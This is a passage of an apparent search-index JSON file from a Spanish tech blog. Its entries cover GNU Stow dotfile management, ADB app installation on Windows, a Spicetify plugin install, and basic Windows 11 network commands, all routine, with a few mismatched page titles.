versiones del software difieren. GNU Stow soluciona esto al centralizar tus archivos y crear enlaces simbólicos automáticamente, manteniendo todo sincronizado."
  },
  {
    "objectID": "operating-system/2025-07-10-gestiona-tus-dotfiles-con-gnu-stow/index.html#qué-es-gnu-stow-y-cómo-funciona",
    "href": "operating-system/2025-07-10-gestiona-tus-dotfiles-con-gnu-stow/index.html#qué-es-gnu-stow-y-cómo-funciona",
    "title": "Cómo Gestionar Dotfiles con GNU Stow",
    "section": "¿Qué es GNU Stow y Cómo Funciona?",
    "text": "¿Qué es GNU Stow y Cómo Funciona?\n\nIntroducción a GNU Stow: Gestión de Symlinks\nGNU Stow es una herramienta que crea y gestiona enlaces simbólicos (symlinks) para tus dotfiles. En lugar de copiar archivos como .bashrc a tu directorio home (~), Stow los mantiene en un repositorio central (ej., ~/dotfiles) y crea enlaces a las ubicaciones correctas. Esto asegura que tus aplicaciones usen las configuraciones sin duplicar archivos, y los cambios se reflejan en el repositorio.\n\n\nConcepto de Paquetes en Stow\nStow organiza tus dotfiles en paquetes, que son subdirectorios en ~/dotfiles (ej., zsh, git, nvim). Cada paquete replica la estructura del sistema. Por ejemplo, para .zshrc, creas ~/dotfiles/zsh/.zshrc. Al ejecutar stow zsh, Stow enlaza ~/dotfiles/zsh/.zshrc a ~/.zshrc. Esta modularidad te permite instalar solo las configuraciones que necesitas en cada máquina.\nEjemplo de Estructura de Repositorio de Dotfiles con Stow:\nImagina que tu directorio principal de dotfiles se llama ~/dotfiles/. Dentro de él, tendrías subdirectorios para cada “paquete”:\n~/dotfiles/\n├── git/\n│   └── .gitconfig\n│   └── .gitignore_global\n├── zsh/\n│   └── .zshrc\n│   └── .p10k.zsh\n└── nvim/\n│   └── .config/\n│       └── nvim/\n│           ├── init.lua\n│           └── lua/\n│               └── plugins.lua\n│\n├── .gitignore\n└── install.sh\n\n\nBeneficios de Usar Stow para Dotfiles\n\nCentralización: Todos tus dotfiles viven en un solo lugar, fáciles de versionar con Git.\nModularidad: Instala configuraciones específicas (ej., solo git) sin tocar otras.\nSincronización: Combina Stow con Git para clonar y desplegar configuraciones en cualquier sistema.\nSimplicidad: Comandos como stow zsh hacen el trabajo pesado por ti.\nPortabilidad: Funciona en Linux, macOS y WSL, ideal para entornos mixtos."
  },
  {
    "objectID": "operating-system/2025-07-10-gestiona-tus-dotfiles-con-gnu-stow/index.html#guía-práctica-configura-tus-dotfiles-con-stow",
    "href": "operating-system/2025-07-10-gestiona-tus-dotfiles-con-gnu-stow/index.html#guía-práctica-configura-tus-dotfiles-con-stow",
    "title": "Cómo Gestionar Dotfiles con GNU Stow",
    "section": "Guía Práctica: Configura tus Dotfiles con Stow",
    "text": "Guía Práctica: Configura tus Dotfiles con Stow\n\nPaso 1: Instala GNU Stow en tu Sistema\nPrimero, instala GNU Stow en tu sistema. Usa el gestor de paquetes de tu distribución:\n\nDebian/Ubuntu:\nsudo apt update\nsudo apt install stow\nFedora:\nsudo dnf install stow\nArch Linux:\nsudo pacman -S stow\nmacOS (con Homebrew):\nbrew install stow\nWindows (WSL): Usa los comandos de Ubuntu dentro de WSL.\n\nVerifica la instalación:\nstow --version\nSi ves la versión (ej., stow 2.3.1), estás listo.\n\n\nPaso 2: Crea y Organiza tu Repositorio de Dotfiles\n\nCrea el directorio de dotfiles:\nmkdir ~/dotfiles\ncd ~/dotfiles\nInicializa un repositorio Git (para versionado y sincronización):\ngit init\nCrea paquetes para tus configuraciones. Por ejemplo, para .gitconfig, .zshrc y .config/nvim:\nmkdir -p git zsh nvim/.config/nvim\nMueve tus dotfiles existentes a los paquetes. Ejemplo:\nmv ~/.gitconfig ~/dotfiles/git/\nmv ~/.zshrc ~/dotfiles/zsh/\nmv ~/.config/nvim/* ~/dotfiles/nvim/.config/nvim/\nCrea un .gitignore para evitar subir archivos sensibles o temporales:\n*.bak\n*.swp\n.DS_Store\nnvim/.local/share/nvim/\nCommitea los cambios:\ngit add .\ngit commit -m \"Inicializar dotfiles\"\ngit remote add origin https://github.com/tu-usuario/dotfiles.git\ngit push -u origin main\n\nTu repositorio ahora está organizado y listo para Stow.\n\n\nPaso 3: Usa Stow para Enlazar Configuraciones\n\nNavega a ~/dotfiles:\ncd ~/dotfiles\nEnlaza un paquete específico:\nstow git\nEsto crea un enlace simbólico: ~/.gitconfig -&gt; ~/dotfiles/git/.gitconfig.\nEnlaza múltiples paquetes:\nstow git zsh nvim\nVerifica los enlaces:\nls -l ~/.gitconfig ~/.zshrc ~/.config/nvim\nDeberías ver algo como:\nlrwxrwxrwx 1 usuario usuario 36 Jul 11 2025 /home/usuario/.gitconfig -&gt; dotfiles/git/.gitconfig\nlrwxrwxrwx 1 usuario usuario 34 Jul 11 2025 /home/usuario/.zshrc -&gt; dotfiles/zsh/.zshrc\nPrueba en otra máquina:\n\nClona el repositorio:\ngit clone https://github.com/tu-usuario/dotfiles.git ~/dotfiles\nInstala Stow y ejecuta:\ncd ~/dotfiles\nstow git zsh nvim\n\n\n\n\nPaso 4: Automatiza con un Script de Instalación\nCrea un script install.sh para automatizar la instalación:\n\nCrea el script:\nnano ~/dotfiles/install.sh\nAñade este contenido:\n#!/bin/bash\n\nDOTFILES_DIR=\"$HOME/dotfiles\"\n\n# Verifica si Stow está instalado\nif ! command -v stow &&gt; /dev/null; then\n    echo \"Error: GNU Stow no está instalado. Instálalo con: sudo apt install stow\"\n    exit 1\nfi\n\n# Enlaza todos los paquetes\ncd \"$DOTFILES_DIR\" || exit\nstow -v git zsh nvim\necho \"Dotfiles instalados correctamente!\"\nHazlo ejecutable:\nchmod +x ~/dotfiles/install.sh\nEjecuta el script:\n./install.sh\nCommitea el script:\ngit add install.sh\ngit commit -m \"Añadir script de instalación\"\ngit push\n\nEste script simplifica el despliegue en cualquier máquina."
  },
  {
    "objectID": "operating-system/2025-07-10-gestiona-tus-dotfiles-con-gnu-stow/index.html#consejos-avanzados-para-optimizar-stow",
    "href": "operating-system/2025-07-10-gestiona-tus-dotfiles-con-gnu-stow/index.html#consejos-avanzados-para-optimizar-stow",
    "title": "Cómo Gestionar Dotfiles con GNU Stow",
    "section": "Consejos Avanzados para Optimizar Stow",
    "text": "Consejos Avanzados para Optimizar Stow\n\nManejo de Conflictos con –adopt\nSi un archivo como ~/.zshrc ya existe, Stow mostrará un error. Usa --adopt para mover el archivo al repositorio y enlazarlo:\n\nEjecuta con --adopt:\ncd ~/dotfiles\nstow --adopt zsh\nCommitea los cambios:\ngit add zsh/.zshrc\ngit commit -m \"Adoptar zshrc existente\"\ngit push\n\nPrecaución: Haz un respaldo antes (ej., cp ~/.zshrc ~/.zshrc.bak).\n\n\nDesvinculación de Paquetes con -D\nPara eliminar enlaces simbólicos sin borrar los archivos en ~/dotfiles:\n\nDesvincula un paquete:\ncd ~/dotfiles\nstow -D zsh\nVerifica:\nls -l ~/.zshrc\nEl enlace debería haber desaparecido, pero ~/dotfiles/zsh/.zshrc permanece.\n\n\n\nCompatibilidad Multiplataforma y Portabilidad\nStow funciona en Linux, macOS y WSL. Para configuraciones específicas:\n\nCrea paquetes por sistema. Ejemplo: kde para Linux, zsh-macos para macOS.\nUsa ramas en Git:\ngit checkout -b macos\ngit add zsh-macos\ngit commit -m \"Configuraciones para macOS\"\ngit push origin macos\nInstala selectivamente:\nstow zsh-macos\n\nEsto asegura que solo uses configuraciones relevantes por máquina."
  },
  {
    "objectID": "operating-system/2025-07-10-gestiona-tus-dotfiles-con-gnu-stow/index.html#alternativas-a-gnu-stow-qué-opciones-existen",
    "href": "operating-system/2025-07-10-gestiona-tus-dotfiles-con-gnu-stow/index.html#alternativas-a-gnu-stow-qué-opciones-existen",
    "title": "Cómo Gestionar Dotfiles con GNU Stow",
    "section": "Alternativas a GNU Stow: ¿Qué Opciones Existen?",
    "text": "Alternativas a GNU Stow: ¿Qué Opciones Existen?\n\nRepositorios Git Bare: Simplicidad y Riesgos\nUn repositorio Git “bare” usa $HOME como área de trabajo:\ngit init --bare ~/.dotfiles\nalias config='/usr/bin/git --git-dir=$HOME/.dotfiles/ --work-tree=$HOME'\nconfig add .zshrc\nconfig commit -m \"Añadir zshrc\"\nVentajas: Simple, no requiere herramientas adicionales. Riesgos: Puedes subir archivos sensibles si no configuras .gitignore.\n\n\nChezmoi y YADM: Herramientas Modernas\n\nChezmoi: Gestiona dotfiles con plantillas y cifrado. Ideal para múltiples sistemas.\nchezmoi init\nchezmoi add ~/.zshrc\nYADM: Wrapper de Git con funciones como alternates.\nyadm init\nyadm add ~/.zshrc\nVentajas: Más funciones que Stow, como gestión de secretos. Desventajas: Mayor curva de aprendizaje.\n\n\n\nHome Manager: Configuración Declarativa\nHome Manager (para NixOS) define dotfiles y paquetes declarativamente:\nhome-manager switch\nVentajas: Configuración completa del sistema. Desventajas: Complejo, requiere aprender Nix."
  },
  {
    "objectID": "operating-system/2025-07-10-gestiona-tus-dotfiles-con-gnu-stow/index.html#conclusión-controla-tu-entorno-digital",
    "href": "operating-system/2025-07-10-gestiona-tus-dotfiles-con-gnu-stow/index.html#conclusión-controla-tu-entorno-digital",
    "title": "Cómo Gestionar Dotfiles con GNU Stow",
    "section": "Conclusión: Controla tu Entorno Digital",
    "text": "Conclusión: Controla tu Entorno Digital\nGNU Stow y Git transforman la gestión de dotfiles en un proceso simple y eficiente. Con Stow, centralizas tus configuraciones, las enlazas con comandos rápidos y las sincronizas con Git. Ya sea que uses Linux, macOS o WSL, este enfoque te ahorra tiempo y mantiene tu entorno consistente. ¡Clona tu repositorio, ejecuta stow y personaliza tu flujo de trabajo hoy! Comparte tus trucos o configuraciones favoritas en los comentarios."
  },
  {
    "objectID": "operating-system/2019-06-19-adb/index.html",
    "href": "operating-system/2019-06-19-adb/index.html",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Microsoft Corporation. Todos los derechos reservados.\n\n\n\n\nC:\\Users\\achalmaedison&gt;cd \"C:\\Users\\achalmaedison\\Downloads\\ADB\"\n\n\n\nC:\\Users\\achalmaedison\\Downloads\\ADB&gt;adb connect 127.0.0.1:58526\nSalida esperada:\nYa conectado a 127.0.0.1:58526\n\n\n\nC:\\Users\\achalmaedison\\Downloads\\ADB&gt;adb install Instagram.apk\nSalida esperada:\nRealizando Instalación en Streaming\nInstalación Exitosa\nEste es un ejemplo de cómo utilizar los comandos ADB en un entorno Windows.\n\n\n\nPuedes descargar ADB desde el siguiente enlace:\nPlataforma de herramientas de Android\n\n\n\n\nConfigurar el subsistema de Android.\nActivar el modo desarrollador.\nCopiar la dirección IP del dispositivo.\nAbrir CMD como administrador.\nNavegar a la carpeta platform-tools ubicada en C:\\platform-tools:\n\ncd C:\\platform-tools\n\n\n\nConectar el dispositivo:\nadb connect 127.0.0.1:58526\nInstalar aplicaciones:\nadb install gmail.apk\nadb install facebook-354-0-0-22-110.apk\nNota: Si los comandos no funcionan, intenta reiniciar el sistema.\n\n\n\nMicrosoft Windows [Version 10.0.22000.527]\n(c) Microsoft Corporation. All rights reserved.\nC:\\platform-tools&gt;adb connect 172.28.22.78\n* daemon not running; starting now at tcp:5037\n* daemon started successfully\nconnected to 172.28.22.78:5555\nC:\\platform-tools&gt;adb install termux-app_v0.118.0+github-debug_arm64-v8a.apk\nPerforming Streamed Install\nSuccess\nC:\\platform-tools&gt;"
  },
  {
    "objectID": "operating-system/2019-06-19-adb/index.html#versión-de-microsoft-windows-10.0.22000.282",
    "href": "operating-system/2019-06-19-adb/index.html#versión-de-microsoft-windows-10.0.22000.282",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Microsoft Corporation. Todos los derechos reservados."
  },
  {
    "objectID": "operating-system/2019-06-19-adb/index.html#cambio-de-directorio-a-la-ubicación-de-adb",
    "href": "operating-system/2019-06-19-adb/index.html#cambio-de-directorio-a-la-ubicación-de-adb",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "C:\\Users\\achalmaedison&gt;cd \"C:\\Users\\achalmaedison\\Downloads\\ADB\""
  },
  {
    "objectID": "operating-system/2019-06-19-adb/index.html#conexión-con-adb",
    "href": "operating-system/2019-06-19-adb/index.html#conexión-con-adb",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "C:\\Users\\achalmaedison\\Downloads\\ADB&gt;adb connect 127.0.0.1:58526\nSalida esperada:\nYa conectado a 127.0.0.1:58526"
  },
  {
    "objectID": "operating-system/2019-06-19-adb/index.html#instalación-de-instagram-apk",
    "href": "operating-system/2019-06-19-adb/index.html#instalación-de-instagram-apk",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "C:\\Users\\achalmaedison\\Downloads\\ADB&gt;adb install Instagram.apk\nSalida esperada:\nRealizando Instalación en Streaming\nInstalación Exitosa\nEste es un ejemplo de cómo utilizar los comandos ADB en un entorno Windows."
  },
  {
    "objectID": "operating-system/2019-06-19-adb/index.html#descarga-de-adb",
    "href": "operating-system/2019-06-19-adb/index.html#descarga-de-adb",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Puedes descargar ADB desde el siguiente enlace:\nPlataforma de herramientas de Android"
  },
  {
    "objectID": "operating-system/2019-06-19-adb/index.html#configuración",
    "href": "operating-system/2019-06-19-adb/index.html#configuración",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Configurar el subsistema de Android.\nActivar el modo desarrollador.\nCopiar la dirección IP del dispositivo.\nAbrir CMD como administrador.\nNavegar a la carpeta platform-tools ubicada en C:\\platform-tools:\n\ncd C:\\platform-tools"
  },
  {
    "objectID": "operating-system/2019-06-19-adb/index.html#comandos-para-conexión-e-instalación-de-aplicaciones",
    "href": "operating-system/2019-06-19-adb/index.html#comandos-para-conexión-e-instalación-de-aplicaciones",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Conectar el dispositivo:\nadb connect 127.0.0.1:58526\nInstalar aplicaciones:\nadb install gmail.apk\nadb install facebook-354-0-0-22-110.apk\nNota: Si los comandos no funcionan, intenta reiniciar el sistema."
  },
  {
    "objectID": "operating-system/2019-06-19-adb/index.html#ejemplo-de-salida-esperada",
    "href": "operating-system/2019-06-19-adb/index.html#ejemplo-de-salida-esperada",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Microsoft Windows [Version 10.0.22000.527]\n(c) Microsoft Corporation. All rights reserved.\nC:\\platform-tools&gt;adb connect 172.28.22.78\n* daemon not running; starting now at tcp:5037\n* daemon started successfully\nconnected to 172.28.22.78:5555\nC:\\platform-tools&gt;adb install termux-app_v0.118.0+github-debug_arm64-v8a.apk\nPerforming Streamed Install\nSuccess\nC:\\platform-tools&gt;"
  },
  {
    "objectID": "operating-system/2024-07-15-instalando-specitify/index.html",
    "href": "operating-system/2024-07-15-instalando-specitify/index.html",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Instrucciones para la Instalación Manual de “Stats” en Spicetify\n\nDescarga y descompresión:\n\nDescarga el archivo zip de la última versión del repositorio de “Stats”.\nDescomprime el archivo descargado.\nRenombra la carpeta descomprimida a stats.\n\nUbicación de la carpeta:\n\nMueve la carpeta stats a la carpeta CustomApps dentro del directorio de Spicetify.\nLa estructura del directorio debería ser similar a la siguiente:\n📦spicetify/CustomApps\n┣ 📂marketplace\n┣ etc...\n┗ 📂stats\n  ┣ 📜extension.js\n  ┣ 📜index.js\n  ┣ 📜manifest.json\n  ┗ 📜style.css\n\nAplicar los cambios:\n\nAbre una terminal o línea de comandos.\nEjecuta los siguientes comandos:\nspicetify config custom_apps stats\nspicetify apply\nEsto configurará y aplicará la aplicación “Stats” en Spicetify.\n\nDisfruta:\n\nAhora deberías tener la aplicación “Stats” funcionando en Spicetify.\n\n\n\n\nDesinstalación de la Aplicación “Stats”\n\nDesinstalación básica:\n\nAbre una terminal o línea de comandos.\nEjecuta los siguientes comandos:\nspicetify config custom_apps stats-\nspicetify apply\nEsto desactivará la aplicación “Stats”.\n\nEliminación completa:\n\nSi deseas eliminar completamente la aplicación, elimina la carpeta stats de CustomApps después de ejecutar los comandos anteriores.\n\n\n\n\nAyuda Adicional\n\nSi necesitas más ayuda con la instalación, visita los Spicetify Docs.\nSi tienes preguntas o problemas relacionados con la aplicación, abre un problema en el repositorio de la aplicación.\nSi te gusta la aplicación, considera dar un like al repositorio.\n\n\n\nResumen de Comandos\n\nPara instalar:\nspicetify config custom_apps stats\nspicetify apply\nPara desinstalar:\nspicetify config custom_apps stats-\nspicetify apply\n\n\n\nPublicaciones Similares\nSi te interesó este artículo, te recomendamos que explores otros blogs y recursos relacionados que pueden ampliar tus conocimientos. Aquí te dejo algunas sugerencias:\n\n Comandos De Informacion Windows\n Adb\n Limpieza Y Optimizacion De Pc\n Usando Apk En Windown 11\n Gestionar Versiones De Jdk En Kubuntu\n Instalar Tor Browser\n Crear Enlaces Duros O Hard Link En Linux\n Comandos Vim\n Guia De Git Y Github\n 00 Primeros Pasos En Linux\n 01 Introduccion Linux\n 02 Distribuciones Linux\n 03 Instalacion Linux\n 04 Administracion Particiones Volumenes\n Atajos De Teclado Y Comandos Para Usar Vim\n Instalando Specitify\n\nEsperamos que encuentres estas publicaciones igualmente interesantes y útiles. ¡Disfruta de la lectura!\n\n\n\n\nReutilizaciónCC BY-SA 4.0Cómo citarPor favor, cita este trabajo como:\nAchalma, Edison. 2024. “Guía de Git Cómo trabajar en equipo en\nproyectos,” July. https://achalmaedison.netlify.app/operating-system/2024-07-15-instalando-specitify/."
  },
  {
    "objectID": "operating-system/2017-05-21-comandos-de-informacion-windows/index.html",
    "href": "operating-system/2017-05-21-comandos-de-informacion-windows/index.html",
    "title": "Comandos en Windows 11 para Gestionar Redes",
    "section": "",
    "text": "En un mundo hiperconectado, saber gestionar tu red en Windows 11 es una habilidad esencial. ¿Alguna vez te has quedado sin internet en medio de un proyecto importante o has necesitado verificar tu conexión rápidamente? Esta guía actualizada para 2025 te enseña comandos prácticos para obtener tu IP pública, inspeccionar controladores Wi-Fi y solucionar problemas de red desde la terminal. Perfecta para usuarios técnicos, profesionales de TI o cualquiera que quiera optimizar su sistema, aquí encontrarás pasos claros, ejemplos reales y consejos avanzados.\nIntroducción: ¿Por Qué Usar Comandos en Windows 11?\nWindows 11, con más de 1.500 millones de usuarios en 2025 según Statista, ofrece una terminal potente que va más allá de la interfaz gráfica. Comandos como nslookup y netsh te dan control directo sobre tu red, revelando detalles que las herramientas visuales no muestran. En esta guía, exploraremos cómo usarlos para diagnosticar conexiones, verificar hardware y mejorar el rendimiento. Entidades como Microsoft y tecnologías como Wi-Fi 6 son protagonistas, mientras términos como “IP pública” o “controladores de red” serán tus aliados. Empecemos.\nComandos Esenciales para Redes en Windows 11\nEstos comandos básicos te permiten explorar y gestionar tu red desde la terminal.\nObtener tu IP Pública\nTu IP pública es tu identidad en internet. Para verla:\n\nAbre CMD o PowerShell.\nEscribe: nslookup myip.opendns.com resolver1.opendns.com.\n\nResultado Ejemplo:\n200.121.132.66\nOpenDNS, un servicio líder en resolución de DNS, te devuelve tu IP actual. Ideal para verificar tu conexión externa.\nConocer tu IP Local\nPara la IP privada en tu red local:\n\nUsa ipconfig.\n\nResultado Ejemplo:\nDirección IPv4: 192.168.1.100\nMáscara de subred: 255.255.255.0\nPuerta de enlace predeterminada: 192.168.1.1\nEsto muestra tu configuración interna, útil para ajustes de red.\nOtros Comandos Básicos\n\nping google.com: Mide la latencia (ej.: 20 ms).\ntracert google.com: Rastrea la ruta de paquetes.\nnetstat -an: Lista conexiones activas.\n\nTabla: Comandos Rápidos\n\n\n\nComando\nUso\nEjemplo\n\n\n\n\nnslookup\nObtener IP pública\nnslookup myip…\n\n\nipconfig\nVer IP local\nipconfig\n\n\nping\nProbar conectividad\nping google.com\n\n\n\nInspeccionando Controladores Wi-Fi con netsh\nEl comando netsh wlan show drivers revela detalles técnicos de tu adaptador Wi-Fi.\nCómo Ejecutarlo\nEn CMD (como administrador):\nnetsh wlan show drivers\nResultado Ejemplo (actualizado 2025):\nInterface name: Wi-Fi\nDriver: Intel(R) Wi-Fi 6 AX201\nVendor: Intel Corporation\nDate: 10/15/2024\nVersion: 23.80.1.5\nRadio types supported: 802.11b 802.11g 802.11n 802.11a 802.11ac 802.11ax\nFIPS 140-2 mode supported: Yes\nAuthentication supported: WPA3-Enterprise, WPA2-Personal, CCMP, GCMP-256\nWireless Display Supported: Yes\nQué Significa\n\nDriver: Intel Wi-Fi 6 AX201, compatible con Wi-Fi 6 (802.11ax), estándar dominante en 2025.\nSeguridad: WPA3 y GCMP-256 aseguran conexiones cifradas.\nSoporte: Miracast y protección de tramas (802.11w) para redes modernas.\n\nÚsalo para confirmar si tu hardware está listo para redes de alta velocidad.\nUsos Prácticos para Profesionales y Usuarios Técnicos\nEstos comandos tienen aplicaciones reales en contextos técnicos:\nSoporte Técnico y Diagnóstico\n\nUsa ping y tracert para identificar caídas de conexión en una red empresarial.\nVerifica con netsh wlan show drivers si un cliente necesita actualizar su adaptador para Wi-Fi 6.\n\nDesarrollo y Pruebas\n\nProgramadores pueden usar ipconfig para configurar entornos de desarrollo local y nslookup para probar APIs externas.\nEjemplo: Asegúrate de que tu servidor local (192.168.1.100) responde antes de subir código.\n\nGestión de Redes Domésticas\n\nCon netstat -an, detecta aplicaciones consumiendo ancho de banda.\nUsa ipconfig /release y ipconfig /renew para refrescar tu IP si hay conflictos.\n\nImagen: Terminal Windows 11 ALT: “Ejecutando comandos de red en Windows 11 2025”\nTécnicas Avanzadas para Redes en 2025\n\nExplorar Redes Disponibles: Usa netsh wlan show networks para listar señales Wi-Fi y elegir la mejor.\nScript Automático: Crea un .bat:\n@echo off\necho IP Pública: &gt; red-info.txt\nnslookup myip.opendns.com resolver1.opendns.com &gt;&gt; red-info.txt\necho Controladores Wi-Fi: &gt;&gt; red-info.txt\nnetsh wlan show drivers &gt;&gt; red-info.txt\nEjecuta para guardar datos en un archivo.\nTF-IDF: Integra términos como “Wi-Fi 6”, “diagnóstico de red”, y “seguridad inalámbrica” (basados en el TOP 10).\nSchema: JSON-LD para “HowTo”:\njson\n{\n  \"@context\": \"https://schema.org\",\n  \"@type\": \"HowTo\",\n  \"name\": \"Cómo Gestionar Redes en Windows 11\",\n  \"step\": [\n    {\"@type\": \"HowToStep\", \"text\": \"Abre CMD y usa nslookup para tu IP pública\"}\n  ]\n}\n\nConclusión: Toma el Control de tu Red Hoy\nDominar comandos en Windows 11 como nslookup, ipconfig, y netsh wlan show drivers te da poder sobre tu red en 2025. Esta guía te equipa con conocimientos prácticos para diagnosticar problemas, optimizar conexiones y aplicar soluciones técnicas. Abre tu terminal, prueba estos comandos, y mejora tu experiencia en Windows 11. ¿Quieres más consejos? Suscríbete a nuestro boletín o visita microsoft.com para recursos adicionales.\n\nPublicaciones Similares\nSi te interesó este artículo, te recomendamos que explores otros blogs y recursos relacionados que pueden ampliar tus conocimientos. Aquí te dejo algunas sugerencias:\n\n Comandos De Informacion Windows\n Adb\n Limpieza Y Optimizacion De Pc\n Usando Apk En Windown 11\n Gestionar Versiones De Jdk En Kubuntu\n Instalar Tor Browser\n Crear Enlaces Duros O Hard Link En Linux\n Comandos Vim\n Guia De Git Y Github\n 00 Primeros Pasos En Linux\n 01 Introduccion Linux\n 02 Distribuciones Linux\n 03 Instalacion Linux\n 04 Administracion Particiones Volumenes\n Atajos De Teclado Y Comandos Para Usar Vim\n Instalando Specitify\n\nEsperamos que encuentres estas publicaciones igualmente interesantes y útiles. ¡Disfruta de la lectura!\n\n\n\n\nReutilizaciónCC BY-SA 4.0Cómo citarPor favor, cita este trabajo como:\nAchalma, Edison. 2023. “Comandos en Windows 11 para Gestionar\nRedes,” February. https://achalmaedison.netlify.app/operating-system/2017-05-21-comandos-de-informacion-windows/."
  }
]